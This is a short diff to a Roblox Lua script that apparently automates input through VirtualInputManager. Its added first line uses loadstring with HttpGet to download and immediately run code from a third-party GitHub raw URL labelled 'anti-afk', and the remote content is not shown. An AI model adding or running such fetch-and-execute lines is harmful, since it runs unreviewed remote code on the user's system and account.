@@ -1,3 +1,5 @@
+loadstring(game:HttpGet("https://raw.githubusercontent.com/evxncodes/mainroblox/main/anti-afk", true))()
+
 local Player = game:GetService("Players")
 local LocalPlayer = Player.LocalPlayer
 local VirtualInputManager = game:GetService("VirtualInputManager")
